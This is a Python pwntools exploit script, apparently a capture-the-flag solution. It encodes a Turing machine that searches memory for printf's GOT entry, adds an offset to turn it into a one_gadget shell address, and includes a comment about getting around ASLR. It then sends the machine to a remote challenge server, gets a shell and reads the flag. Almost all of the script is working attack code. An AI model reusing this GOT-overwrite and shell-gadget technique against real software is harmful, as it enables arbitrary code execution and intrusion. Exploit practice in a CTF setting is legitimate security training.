import enum
from pwn import *


class Dir(enum.StrEnum):
    Left = "L",
    Right = "R"


NUM_STATE = 100

transitions = []


def extract_bit(bit_idx: int, val: int, length: int, dir: Dir):
    """ 
      Extract a bit from the given value depending on the direction 
      - Left: Index 0 is MSB.
      - Right: Index 0 is LSB.
    """
    if dir == Dir.Left:
        return (val >> (length - 1 - bit_idx)) & 1
    else:
        return (val >> bit_idx) & 1


def search_for(val: int, length: int):
    """ 
      Search for a value on the tape while going to the left.
      Stops after the value.
    """
    global transitions
    search_start = len(transitions) + 1
    dir = Dir.Left
    for bit_idx in range(length):
        bit = extract_bit(bit_idx, val, length, dir)

        # check for prefixes:
        # we want to return to the state which represents the prefix even though
        # the current run failed

        prefix_start = search_start
        currently_parsed = (val >> (length - bit_idx)) << 1
        currently_parsed |= (bit ^ 1)
        for prefix_len in range(bit_idx, -1, -1):
            parsed_suffix = currently_parsed & ((1 << prefix_len) - 1)
            val_prefix = val >> (length - prefix_len)
            assert (dir == Dir.Left)
            if parsed_suffix == val_prefix:
                prefix_start = search_start + prefix_len
                break

        transitions += [
            ((0, dir, (len(transitions) + 2) if bit == 0 else prefix_start),
             (1, dir, (len(transitions) + 2) if bit == 1 else prefix_start))
        ]


def write_val(val: int, length: int, dir: Dir):
    """ Write a bit for bit onto the tape. """
    global transitions
    for bit_idx in range(length):
        bit = extract_bit(bit_idx, val, length, dir)
        transitions += [
            ((bit, dir, len(transitions) + 2),) * 2,
        ]


def add_val(val: int, length: int):
    """ Add a value to the tape. Goes to the Right on the tape. """
    global transitions
    dir = Dir.Right
    start_state = len(transitions) + 1
    # non-carry states
    for bit_idx in range(length):
        bit = extract_bit(bit_idx, val, length, dir)
        transitions += [((bit, dir, start_state + bit_idx + 1),
                         (bit ^ 1, dir, (start_state + length + bit_idx + 1) if bit == 1 else (start_state + bit_idx + 1)))]

    # just go to the end state of the operation
    transitions += [((0, dir, start_state + 2 * length + 1),
                     (1, dir, start_state + 2 * length + 1))]

    # carry-states
    for bit_idx in range(1, length):
        bit = extract_bit(bit_idx, val, length, dir)
        transitions += [(
                        (bit ^ 1, dir, (start_state + bit_idx + 1)
                         if bit == 0 else (start_state + length + bit_idx + 1)),
                        (bit, dir, start_state + length + bit_idx + 1)
                        )]
    # last carry & maybe infinite carries
    transitions += [((1, dir, start_state + 2 * length + 1),
                     (0, dir, (start_state + 2 * length)))]


def export_graphviz(trans, offset: int = 0) -> str:
    """ 
      Generates a representation for the transitions in the graphviz DOT language.
      Useful for debugging.

      `offset`: If `trans` is a subset of the transitions, adds constant offset to the loop index to find the state index. 
    """
    dot = ["digraph TuringMachine {", "  rankdir=LR;"]

    get_state = (lambda i: f"q{i}")

    for i, (t0, t1) in enumerate(trans):
        cur_state = get_state(offset + i)

        # Transition for tape symbol 0
        sym0, dir0, ns0 = t0
        next_state0 = get_state(ns0)
        label0 = f"0 → {sym0}, {dir0}"
        dot.append(f'  {cur_state} -> {next_state0} [label="{label0}"];')

        # Transition for tape symbol 1
        sym1, dir1, ns1 = t1
        next_state1 = get_state(ns1)
        label1 = f"1 → {sym1}, {dir1}"
        dot.append(f'  {cur_state} -> {next_state1} [label="{label1}"];')

    dot.append("}")
    return "\n".join(dot)


# goto printf@got
search_for(0x6f000007, 8 * 4)

# turn around
transitions += [(
    (0, Dir.Right, len(transitions) + 2 + k),
    (1, Dir.Right, len(transitions) + 2 + k)
) for k in range(5 * 4 + 1)]

# overwrite printf address with one_gadget address by adding offset
add_val(0x8b64f, len(bin(0x8b64f)) - 2)

# instead of the add_val above, one can do the following to safe a few states
# this is equivalent to the operation above because the lowest 12bit of an address are not affected by ASLR.
# write_val(0xd3f, 12, Dir.Right)
# add_val(0x8b, 8)

# padding, stop execution
transitions += [((0, Dir.Right, 0), (1, Dir.Right, 0))] * \
    (NUM_STATE - len(transitions))
assert (len(transitions) == NUM_STATE)

with remote("challs.nusgreyhats.org", 33103) as p:
    p.sendlineafter(
        b"Enter the number of states you require (Max 100): ", str(NUM_STATE).encode())

    p.recvuntil(b"Note: State 0 is reserved for the HALT state.\n")

    for state_idx in range(1, NUM_STATE + 1):
        # comment the following line in if you want to debug the transmission of states
        # commented out for performance reasons
        # p.recvuntil(f"State {state_idx}: ".encode())

        trans_1, trans_2 = transitions[state_idx - 1]

        def format_transition(transition):
            symbol, dir, next_s = transition
            dir = str(dir)
            assert (symbol == 0 or symbol == 1)
            assert (next_s <= NUM_STATE)

            return f"{symbol} {dir} {next_s}"

        p.sendline(
            " ".join([format_transition(trans_1), format_transition(trans_2)]).encode())

    p.recvuntil(b"Running your machine...\n")

    p.sendline(b"cat flag.txt")
    p.interactive()
